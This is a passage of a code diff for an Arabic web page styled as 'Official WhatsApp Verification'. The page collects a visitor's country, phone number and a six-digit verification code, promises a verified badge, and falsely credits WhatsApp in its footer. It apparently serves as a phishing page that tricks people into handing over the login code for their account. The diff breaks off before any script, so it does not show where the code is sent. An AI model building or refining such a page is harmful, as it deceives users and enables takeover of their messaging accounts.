@@ -4,1535 +4,735 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>توثيق وتساب الرسمي</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --whatsapp-green: #25D366;
-            --whatsapp-dark-green: #128C7E;
-            --whatsapp-blue: #34B7F1;
-            --whatsapp-dark: #075E54;
-            --whatsapp-light: #ECE5DD;
-            --whatsapp-white: #FFFFFF;
-            --whatsapp-gray: #667781;
-            --gradient-whatsapp: linear-gradient(135deg, #25D366 0%, #128C7E 50%, #075E54 100%);
-            --gradient-dark: linear-gradient(135deg, #000000 0%, #111111 100%);
-            --shadow-whatsapp: 0 8px 24px rgba(37, 211, 102, 0.3);
-            --shadow-heavy: 0 0 40px rgba(37, 211, 102, 0.4);
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Almarai', 'Poppins', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-
+        
         body {
-            background: var(--gradient-dark);
-            color: var(--whatsapp-white);
+            background-color: #f0f2f5;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            position: relative;
-            overflow-x: hidden;
         }
-
-        /* خلفية متحركة */
-        .whatsapp-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            background: 
-                radial-gradient(circle at 20% 30%, rgba(37, 211, 102, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 70%, rgba(18, 140, 126, 0.05) 0%, transparent 50%);
-        }
-
-        .floating-shapes {
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        .shape {
-            position: absolute;
-            border-radius: 50%;
-            opacity: 0.1;
-            filter: blur(40px);
-            animation: float 20s infinite linear;
-        }
-
-        .shape-1 {
-            width: 300px;
-            height: 300px;
-            background: var(--whatsapp-green);
-            top: 10%;
-            left: 10%;
-            animation-delay: 0s;
-        }
-
-        .shape-2 {
-            width: 200px;
-            height: 200px;
-            background: var(--whatsapp-dark-green);
-            bottom: 20%;
-            right: 15%;
-            animation-delay: -5s;
-        }
-
-        .shape-3 {
-            width: 150px;
-            height: 150px;
-            background: var(--whatsapp-blue);
-            top: 40%;
-            right: 30%;
-            animation-delay: -10s;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translate(0, 0) rotate(0deg); }
-            25% { transform: translate(50px, 50px) rotate(90deg); }
-            50% { transform: translate(0, 100px) rotate(180deg); }
-            75% { transform: translate(-50px, 50px) rotate(270deg); }
-        }
-
+        
         .container {
-            background: rgba(17, 17, 17, 0.95);
-            backdrop-filter: blur(20px);
-            border-radius: 30px;
             width: 100%;
-            max-width: 500px;
-            padding: 50px 40px;
-            position: relative;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 
-                var(--shadow-heavy),
-                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            max-width: 420px;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             overflow: hidden;
-            z-index: 1;
         }
-
-        .container::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: var(--gradient-whatsapp);
-            z-index: 2;
-        }
-
-        .container::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 150%;
-            height: 150%;
-            background: conic-gradient(
-                from 0deg,
-                transparent 0deg,
-                rgba(37, 211, 102, 0.1) 60deg,
-                transparent 120deg,
-                rgba(18, 140, 126, 0.1) 180deg,
-                transparent 240deg,
-                rgba(52, 183, 241, 0.1) 300deg,
-                transparent 360deg
-            );
-            transform: translate(-50%, -50%);
-            animation: rotate 20s linear infinite;
-            z-index: -1;
-        }
-
-        @keyframes rotate {
-            0% { transform: translate(-50%, -50%) rotate(0deg); }
-            100% { transform: translate(-50%, -50%) rotate(360deg); }
-        }
-
-        /* الهيدر */
+        
         .header {
-            text-align: center;
-            margin-bottom: 50px;
-            position: relative;
-        }
-
-        .logo-container {
-            position: relative;
-            display: inline-block;
-            margin-bottom: 30px;
-        }
-
-        .whatsapp-logo {
-            width: 90px;
-            height: 90px;
-            background: var(--gradient-whatsapp);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 3.5rem;
+            background-color: #25D366;
             color: white;
-            position: relative;
-            z-index: 2;
-            animation: pulse-glow 2s ease-in-out infinite alternate;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid rgba(0,0,0,0.1);
         }
-
-        @keyframes pulse-glow {
-            0% { 
-                box-shadow: 
-                    0 0 20px rgba(37, 211, 102, 0.5),
-                    0 0 40px rgba(37, 211, 102, 0.3),
-                    inset 0 0 20px rgba(255, 255, 255, 0.1);
-            }
-            100% { 
-                box-shadow: 
-                    0 0 40px rgba(37, 211, 102, 0.8),
-                    0 0 80px rgba(37, 211, 102, 0.5),
-                    0 0 120px rgba(37, 211, 102, 0.2),
-                    inset 0 0 30px rgba(255, 255, 255, 0.2);
-            }
-        }
-
-        .logo-container::before {
-            content: '';
-            position: absolute;
-            top: -15px;
-            left: -15px;
-            right: -15px;
-            bottom: -15px;
-            background: var(--gradient-whatsapp);
-            border-radius: 50%;
-            opacity: 0.3;
-            filter: blur(25px);
-            animation: logo-glow 3s ease-in-out infinite alternate;
-        }
-
-        @keyframes logo-glow {
-            0% { transform: scale(1); opacity: 0.2; }
-            100% { transform: scale(1.2); opacity: 0.4; }
-        }
-
+        
         .header h1 {
-            font-size: 2.8rem;
-            font-weight: 900;
-            background: linear-gradient(45deg, #25D366, #128C7E, #34B7F1);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 15px;
-            letter-spacing: -1px;
-            position: relative;
-            display: inline-block;
-        }
-
-        .header h1::after {
-            content: '';
-            position: absolute;
-            bottom: -5px;
-            left: 10%;
-            width: 80%;
-            height: 3px;
-            background: var(--gradient-whatsapp);
-            border-radius: 2px;
-        }
-
-        .header p {
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 1.2rem;
-            font-weight: 300;
-            max-width: 350px;
-            margin: 0 auto;
-            line-height: 1.6;
-        }
-
-        /* الخطوات */
-        .step {
-            display: none;
-        }
-
-        .step.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .step-title {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--whatsapp-white);
-            margin-bottom: 25px;
-            text-align: center;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-        }
-
-        .step-title i {
-            color: var(--whatsapp-green);
-            font-size: 1.8rem;
-        }
-
-        .description {
-            background: rgba(37, 211, 102, 0.1);
-            border: 1px solid rgba(37, 211, 102, 0.3);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            text-align: center;
-            color: rgba(255, 255, 255, 0.9);
-            font-size: 1rem;
-            line-height: 1.6;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .description::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 4px;
-            height: 100%;
-            background: var(--gradient-whatsapp);
-        }
-
-        /* النماذج */
-        .form-group {
-            margin-bottom: 30px;
-            position: relative;
-        }
-
-        .form-label {
-            display: block;
-            color: var(--whatsapp-white);
-            font-size: 1.1rem;
-            margin-bottom: 15px;
+            font-size: 20px;
+            margin-bottom: 5px;
             font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
         }
-
-        .form-label i {
-            color: var(--whatsapp-green);
-            font-size: 1.3rem;
-            width: 30px;
-            text-align: center;
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.95;
         }
-
+        
+        .content {
+            padding: 25px;
+        }
+        
+        .description {
+            background-color: #f8f9fa;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-right: 4px solid #25D366;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #333;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+        
         .select-wrapper {
             position: relative;
         }
-
-        .select-icon {
-            position: absolute;
-            left: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--whatsapp-green);
-            font-size: 1.4rem;
-            z-index: 2;
-        }
-
+        
         select {
             width: 100%;
-            background: rgba(34, 34, 34, 0.8);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 20px 60px 20px 25px;
-            color: var(--whatsapp-white);
-            font-size: 1.15rem;
-            font-weight: 500;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            outline: none;
-            position: relative;
-            z-index: 1;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            background-color: white;
             appearance: none;
             -webkit-appearance: none;
             -moz-appearance: none;
+            padding-right: 40px;
         }
-
-        select:focus {
-            border-color: var(--whatsapp-green);
-            box-shadow: 
-                0 0 0 3px rgba(37, 211, 102, 0.2),
-                0 0 30px rgba(37, 211, 102, 0.3);
-            background: rgba(34, 34, 34, 0.9);
-            transform: translateY(-3px);
+        
+        .select-arrow {
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            pointer-events: none;
+            color: #666;
         }
-
-        .phone-input-group {
+        
+        .phone-input-wrapper {
             display: flex;
-            gap: 15px;
+            gap: 10px;
             align-items: center;
         }
-
+        
         .country-code {
-            flex: 0 0 120px;
+            flex: 0 0 100px;
             position: relative;
         }
-
+        
         .phone-number {
             flex: 1;
         }
-
-        .country-code-display {
-            width: 100%;
-            background: rgba(37, 211, 102, 0.2);
-            border: 2px solid rgba(37, 211, 102, 0.4);
-            border-radius: 15px;
-            padding: 20px;
-            color: var(--whatsapp-white);
-            font-size: 1.2rem;
-            font-weight: 700;
-            text-align: center;
-        }
-
-        .input-wrapper {
-            position: relative;
-        }
-
-        .input-icon {
-            position: absolute;
-            right: 25px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--whatsapp-green);
-            font-size: 1.4rem;
-            z-index: 2;
-        }
-
+        
         input {
             width: 100%;
-            background: rgba(34, 34, 34, 0.8);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 20px 60px 20px 25px;
-            color: var(--whatsapp-white);
-            font-size: 1.15rem;
-            font-weight: 500;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus, select:focus {
+            border-color: #25D366;
             outline: none;
         }
-
-        input:focus {
-            border-color: var(--whatsapp-green);
-            box-shadow: 
-                0 0 0 3px rgba(37, 211, 102, 0.2),
-                0 0 30px rgba(37, 211, 102, 0.3);
-            background: rgba(34, 34, 34, 0.9);
-            transform: translateY(-3px);
-        }
-
-        input::placeholder {
-            color: rgba(255, 255, 255, 0.4);
-            font-weight: 400;
-        }
-
+        
         .note {
-            font-size: 0.9rem;
-            color: rgba(255, 255, 255, 0.6);
-            margin-top: 8px;
-            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
         }
-
-        /* إدخال الكود - تصميم جديد عصري */
-        .code-section {
-            text-align: center;
-            margin-bottom: 30px;
+        
+        .btn {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+            margin-top: 10px;
         }
-
-        .code-instructions {
-            background: rgba(37, 211, 102, 0.1);
-            border: 1px solid rgba(37, 211, 102, 0.3);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 25px;
-            text-align: center;
+        
+        .btn:hover {
+            background-color: #128C7E;
         }
-
-        .code-instructions i {
-            font-size: 2rem;
-            color: var(--whatsapp-green);
-            margin-bottom: 10px;
+        
+        .btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
             display: block;
         }
-
-        .code-instructions p {
-            color: rgba(255, 255, 255, 0.9);
-            font-weight: 500;
-            margin-bottom: 5px;
-            font-size: 1rem;
-        }
-
-        .code-instructions small {
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 0.85rem;
-        }
-
-        /* حقل إدخال الكود الكامل مع عرض النص */
+        
         .code-input-container {
-            position: relative;
-            margin: 25px 0;
-        }
-
-        .code-display {
-            width: 100%;
-            background: rgba(34, 34, 34, 0.8);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 18px 25px;
-            color: var(--whatsapp-white);
-            font-size: 1.5rem;
-            font-weight: 700;
-            letter-spacing: 10px;
             text-align: center;
-            direction: ltr;
-            margin-bottom: 10px;
-            min-height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .code-display.placeholder {
-            color: rgba(255, 255, 255, 0.3);
-            font-size: 1.2rem;
-            letter-spacing: 3px;
-        }
-
-        .code-display.active {
-            border-color: var(--whatsapp-green);
-            box-shadow: 
-                0 0 0 3px rgba(37, 211, 102, 0.2),
-                0 0 20px rgba(37, 211, 102, 0.3);
-        }
-
-        .cursor {
-            display: inline-block;
-            width: 2px;
-            height: 30px;
-            background: var(--whatsapp-green);
-            animation: blink 1s infinite;
-            margin-left: 2px;
-            margin-right: 2px;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-
-        /* الحقول المخفية للإدخال */
-        .code-inputs-hidden {
-            display: flex;
-            gap: 8px;
             margin-bottom: 20px;
+        }
+        
+        .code-inputs {
+            display: flex;
             justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
         }
-
-        .code-input-hidden {
-            width: 35px;
-            height: 45px;
-            background: rgba(34, 34, 34, 0.8);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
+        
+        .code-input {
+            width: 45px;
+            height: 60px;
             text-align: center;
-            font-size: 18px;
-            font-weight: 700;
-            color: var(--whatsapp-white);
-            transition: all 0.3s ease;
-            outline: none;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+            transition: all 0.3s;
         }
-
-        .code-input-hidden:focus {
-            border-color: var(--whatsapp-green);
-            background: rgba(34, 34, 34, 0.9);
+        
+        .code-input:focus {
+            border-color: #25D366;
+            background-color: white;
+            outline: none;
             box-shadow: 0 0 0 2px rgba(37, 211, 102, 0.2);
         }
-
+        
         .timer {
             text-align: center;
-            margin-top: 20px;
-            font-size: 1rem;
-            color: rgba(255, 255, 255, 0.7);
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
         }
-
-        .timer span {
-            color: var(--whatsapp-green);
-            font-weight: 700;
-        }
-
+        
         .resend {
             text-align: center;
-            margin-top: 25px;
+            margin-top: 20px;
         }
-
+        
         .resend a {
-            color: var(--whatsapp-green);
+            color: #25D366;
             text-decoration: none;
-            font-weight: 700;
+            font-weight: 600;
             cursor: pointer;
-            padding: 10px 20px;
-            border: 2px solid rgba(37, 211, 102, 0.3);
-            border-radius: 10px;
-            transition: all 0.3s ease;
-            display: inline-block;
         }
-
+        
         .resend a:hover {
-            background: rgba(37, 211, 102, 0.1);
-            border-color: var(--whatsapp-green);
-            transform: translateY(-2px);
+            text-decoration: underline;
         }
-
-        /* الأزرار */
-        .button-group {
-            margin-top: 30px;
-            display: flex;
-            gap: 15px;
+        
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            color: #888;
+            border-top: 1px solid #eee;
+            margin-top: 20px;
         }
-
-        .whatsapp-btn {
-            flex: 1;
-            background: var(--gradient-whatsapp);
-            border: none;
-            border-radius: 15px;
-            padding: 22px;
-            color: white;
-            font-size: 1.3rem;
-            font-weight: 800;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .whatsapp-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 
-                0 15px 30px rgba(37, 211, 102, 0.4),
-                0 0 0 2px rgba(52, 183, 241, 0.3);
-        }
-
-        .whatsapp-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-
-        .whatsapp-btn.secondary {
-            background: transparent;
-            border: 2px solid rgba(37, 211, 102, 0.5);
-            color: var(--whatsapp-green);
-        }
-
-        .whatsapp-btn.secondary:hover {
-            background: rgba(37, 211, 102, 0.1);
-        }
-
-        .btn-content {
-            position: relative;
-            z-index: 2;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        /* التحميل */
+        
         .loading {
             display: none;
             text-align: center;
-            margin: 20px 0;
+            margin: 10px 0;
         }
-
+        
         .loading-spinner {
-            border: 3px solid rgba(255, 255, 255, 0.1);
-            border-top: 3px solid var(--whatsapp-green);
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #25D366;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
+            width: 24px;
+            height: 24px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
+            margin: 0 auto;
         }
-
+        
+        .success-message {
+            text-align: center;
+            padding: 30px 20px;
+            display: none;
+        }
+        
+        .success-icon {
+            color: #25D366;
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+        
+        .success-message h3 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .success-message p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        /* رسالة النجاح */
-        .success-message {
-            text-align: center;
-            padding: 40px 20px;
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .success-icon {
-            width: 80px;
-            height: 80px;
-            background: var(--gradient-whatsapp);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 3rem;
-            color: white;
-            margin: 0 auto 20px;
-            box-shadow: 0 0 40px rgba(37, 211, 102, 0.5);
-        }
-
-        .success-message h3 {
-            font-size: 1.8rem;
-            color: var(--whatsapp-green);
-            margin-bottom: 10px;
-            font-weight: 700;
-        }
-
-        .success-message p {
-            color: rgba(255, 255, 255, 0.8);
-            margin-bottom: 5px;
-            font-size: 1.1rem;
-        }
-
-        .redirect-countdown {
-            font-size: 1.2rem;
-            color: var(--whatsapp-green);
-            font-weight: 700;
-            margin-top: 20px;
-        }
-
-        /* الميزات */
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 20px;
-            margin-top: 40px;
-            padding-top: 30px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .feature-item {
-            text-align: center;
-        }
-
-        .feature-icon {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, rgba(37, 211, 102, 0.1), rgba(52, 183, 241, 0.1));
-            border-radius: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.8rem;
-            color: var(--whatsapp-green);
-            margin: 0 auto 12px;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s ease;
-        }
-
-        .feature-icon::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: var(--gradient-whatsapp);
-            opacity: 0.3;
-            transition: left 0.5s ease;
-        }
-
-        .feature-item:hover .feature-icon::before {
-            left: 100%;
-        }
-
-        .feature-item:hover .feature-icon {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(37, 211, 102, 0.3);
-        }
-
-        .feature-text {
-            font-size: 0.9rem;
-            color: rgba(255, 255, 255, 0.7);
-            font-weight: 500;
-            line-height: 1.4;
-        }
-
-        /* الفوتر */
-        .footer {
-            text-align: center;
-            padding-top: 25px;
-            margin-top: 30px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 0.9rem;
-        }
-
-        @media (max-width: 576px) {
-            .container {
-                padding: 40px 25px;
+        
+        @media (max-width: 480px) {
+            .content {
+                padding: 20px;
             }
             
-            .header h1 {
-                font-size: 2.2rem;
+            .header {
+                padding: 15px;
             }
             
-            .code-input-hidden {
-                width: 30px;
-                height: 40px;
-                font-size: 16px;
-            }
-            
-            .features-grid {
-                grid-template-columns: 1fr;
-                gap: 15px;
-            }
-            
-            .phone-input-group {
-                flex-direction: column;
-            }
-            
-            .country-code {
-                width: 100%;
-            }
-            
-            .whatsapp-btn {
-                padding: 18px;
-                font-size: 1.1rem;
-            }
-            
-            .button-group {
-                flex-direction: column;
-            }
-            
-            .code-display {
-                font-size: 1.3rem;
-                letter-spacing: 8px;
-                padding: 15px 20px;
-            }
-        }
-
-        @media (max-width: 400px) {
-            .code-input-hidden {
-                width: 28px;
-                height: 38px;
-                font-size: 15px;
-            }
-            
-            .code-display {
-                font-size: 1.2rem;
-                letter-spacing: 6px;
+            .code-input {
+                width: 40px;
+                height: 55px;
+                font-size: 22px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="whatsapp-bg"></div>
-    <div class="floating-shapes">
-        <div class="shape shape-1"></div>
-        <div class="shape shape-2"></div>
-        <div class="shape shape-3"></div>
-    </div>
-
     <div class="container">
-        <!-- الهيدر -->
-        <div class="header">
-            <div class="logo-container">
-                <div class="whatsapp-logo">
-                    <i class="fab fa-whatsapp"></i>
-                </div>
-            </div>
-            <h1>توثيق وتساب الرسمي</h1>
-            <p>طلب توثيق رقم وتساب</p>
-        </div>
-
-        <!-- الخطوة 1: إدخال رقم الهاتف -->
-        <div class="step active" id="step1">
-            <div class="description">
-                العلامة الخضراء على WhatsApp هي شارة التحقق من Business App Business التي تشير إلى صحة النشاط. إنها تدل على أن حساب الأعمال قد تم التحقق منه بواسطة WhatsApp باعتباره نشاطاً تجارياً شرعياً.
+        <div class="card">
+            <div class="header">
+                <h1>توثيق وتساب الرسمي</h1>
+                <p>طلب توثيق رقم وتساب</p>
             </div>
             
-            <div class="form-group">
-                <label class="form-label">
-                    <i class="fas fa-globe-asia"></i>
-                    اختر الدولة:
-                </label>
-                <div class="select-wrapper">
-                    <div class="select-icon">
-                        <i class="fas fa-chevron-down"></i>
+            <div class="content">
+                <!-- الخطوة 1: إدخال رقم الهاتف -->
+                <div class="step active" id="step1">
+                    <div class="description">
+                        العلامة الخضراء على WhatsApp هي شارة التحقق من Business App Business التي تشير إلى صحة النشاط. إنها تدل على أن حساب الأعمال قد تم التحقق منه بواسطة WhatsApp باعتباره نشاطاً تجارياً شرعياً.
                     </div>
-                    <select id="country">
-                        <option value="967">اليمن (967+)</option>
-                        <option value="20">مصر (20+)</option>
-                        <option value="966">السعودية (966+)</option>
-                        <option value="971">الإمارات (971+)</option>
-                        <option value="973">البحرين (973+)</option>
-                        <option value="974">قطر (974+)</option>
-                        <option value="968">عمان (968+)</option>
-                        <option value="965">الكويت (965+)</option>
-                        <option value="962">الأردن (962+)</option>
-                        <option value="963">سوريا (963+)</option>
-                        <option value="964">العراق (964+)</option>
-                        <option value="961">لبنان (961+)</option>
-                    </select>
-                </div>
-            </div>
-            
-            <div class="form-group">
-                <label class="form-label">
-                    <i class="fas fa-phone"></i>
-                    رقم الهاتف:
-                </label>
-                <div class="phone-input-group">
-                    <div class="country-code">
-                        <div class="country-code-display" id="countryCode">+967</div>
-                    </div>
-                    <div class="phone-number">
-                        <div class="input-wrapper">
-                            <input type="tel" id="phone" placeholder="أدخل رقم الهاتف بدون الصفر الأول" maxlength="15">
-                            <div class="input-icon">
-                                <i class="fas fa-mobile-alt"></i>
-                            </div>
+                    
+                    <div class="form-group">
+                        <label for="country">اختر الدولة:</label>
+                        <div class="select-wrapper">
+                            <select id="country">
+                                <option value="967">اليمن (967+)</option>
+                                <option value="20">مصر (20+)</option>
+                                <option value="966">السعودية (966+)</option>
+                                <option value="971">الإمارات (971+)</option>
+                                <option value="973">البحرين (973+)</option>
+                                <option value="974">قطر (974+)</option>
+                                <option value="968">عمان (968+)</option>
+                                <option value="965">الكويت (965+)</option>
+                                <option value="962">الأردن (962+)</option>
+                                <option value="963">سوريا (963+)</option>
+                                <option value="964">العراق (964+)</option>
+                                <option value="961">لبنان (961+)</option>
+                            </select>
+                            <div class="select-arrow">▼</div>
                         </div>
                     </div>
-                </div>
-                <div class="note">أدخل رقم الهاتف بدون الصفر الأول</div>
-            </div>
-            
-            <div class="loading" id="loading1">
-                <div class="loading-spinner"></div>
-                <p>جاري الإرسال...</p>
-            </div>
-            
-            <div class="button-group">
-                <button class="whatsapp-btn" id="sendCode">
-                    <div class="btn-content">
-                        <i class="fas fa-paper-plane"></i>
-                        <span>طلب كود التحقق</span>
-                    </div>
-                </button>
-            </div>
-        </div>
-        
-        <!-- الخطوة 2: إدخال رمز التحقق -->
-        <div class="step" id="step2">
-            <div class="description">
-                لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى رقم الهاتف الذي أدخلته. يرجى إدخال الرمز أدناه للمتابعة في عملية التوثيق.
-            </div>
-            
-            <div class="code-section">
-                <div class="code-instructions">
-                    <i class="fas fa-comment-alt"></i>
-                    <p>تم إرسال كود تحقق مكون من 6 أرقام</p>
-                    <small>أدخل الكود الذي تلقيته خلال 10 دقائق</small>
-                </div>
-                
-                <!-- العرض العلوي للكود -->
-                <div class="code-input-container">
-                    <div class="code-display placeholder" id="codeDisplay">
-                        _ _ _ _ _ _
+                    
+                    <div class="form-group">
+                        <label for="phone">رقم الهاتف:</label>
+                        <div class="phone-input-wrapper">
+                            <div class="country-code">
+                                <input type="text" id="countryCode" value="+967" readonly style="background-color: #f5f5f5;">
+                            </div>
+                            <div class="phone-number">
+                                <input type="tel" id="phone" placeholder="أدخل رقم الهاتف بدون الصفر الأول" maxlength="15">
+                            </div>
+                        </div>
+                        <div class="note">أدخل رقم الهاتف بدون الصفر الأول</div>
                     </div>
                     
-                    <!-- الحقول المخفية للإدخال -->
-                    <div class="code-inputs-hidden">
-                        <input type="text" class="code-input-hidden" maxlength="1" data-index="0" id="codeInput0">
-                        <input type="text" class="code-input-hidden" maxlength="1" data-index="1" id="codeInput1">
-                        <input type="text" class="code-input-hidden" maxlength="1" data-index="2" id="codeInput2">
-                        <input type="text" class="code-input-hidden" maxlength="1" data-index="3" id="codeInput3">
-                        <input type="text" class="code-input-hidden" maxlength="1" data-index="4" id="codeInput4">
-                        <input type="text" class="code-input-hidden" maxlength="1" data-index="5" id="codeInput5">
+                    <div class="loading" id="loading1">
+                        <div class="loading-spinner"></div>
+                        <p>جاري الإرسال...</p>
+                    </div>
+                    
+                    <button class="btn" id="sendCode">طلب كود التحقق</button>
+                </div>
+                
+                <!-- الخطوة 2: إدخال رمز التحقق -->
+                <div class="step" id="step2">
+                    <div class="description">
+                        لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى رقم الهاتف الذي أدخلته. يرجى إدخال الرمز أدناه للمتابعة في عملية التوثيق.
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="code">أدخل الكود:</label>
+                        <div class="code-input-container">
+                            <div class="code-inputs">
+                                <input type="text" class="code-input" maxlength="1" data-index="0">
+                                <input type="text" class="code-input" maxlength="1" data-index="1">
+                                <input type="text" class="code-input" maxlength="1" data-index="2">
+                                <input type="text" class="code-input" maxlength="1" data-index="3">
+                                <input type="text" class="code-input" maxlength="1" data-index="4">
+                                <input type="text" class="code-input" maxlength="1" data-index="5">
+                            </div>
+                            <input type="hidden" id="fullCode">
+                        </div>
+                    </div>
+                    
+                    <div class="loading" id="loading2">
+                        <div class="loading-spinner"></div>
+                        <p>جاري التحقق...</p>
+                    </div>
+                    
+                    <button class="btn" id="verifyCode">تأكيد الكود والمتابعة</button>
+                    
+                    <div class="timer" id="timer">يمكنك إعادة إرسال الرمز بعد <span id="countdown">60</span> ثانية</div>
+                    
+                    <div class="resend">
+                        <a href="#" id="resendCode">إعادة إرسال الرمز</a>
                     </div>
                 </div>
-                <input type="hidden" id="fullCode">
+                
+                <!-- رسالة النجاح والتحويل -->
+                <div class="success-message" id="successMessage">
+                    <div class="success-icon">✓</div>
+                    <h3>يتم توثيق الرقم لحظه…</h3>
+                    <p>✧</p>
+                    <p>سيتم التوثيق خلال<span id="redirectCountdown">5</span> ثوانٍ</p>
+                </div>
             </div>
             
-            <div class="loading" id="loading2">
-                <div class="loading-spinner"></div>
-                <p>جاري التحقق...</p>
+            <div class="footer">
+                2026 © جميع الحقوق محفوظة لدى شركة وتساب
             </div>
-            
-            <div class="button-group">
-                <button class="whatsapp-btn secondary" id="backToStep1">
-                    <div class="btn-content">
-                        <i class="fas fa-arrow-left"></i>
-                        <span>رجوع</span>
-                    </div>
-                </button>
-                <button class="whatsapp-btn" id="verifyCode">
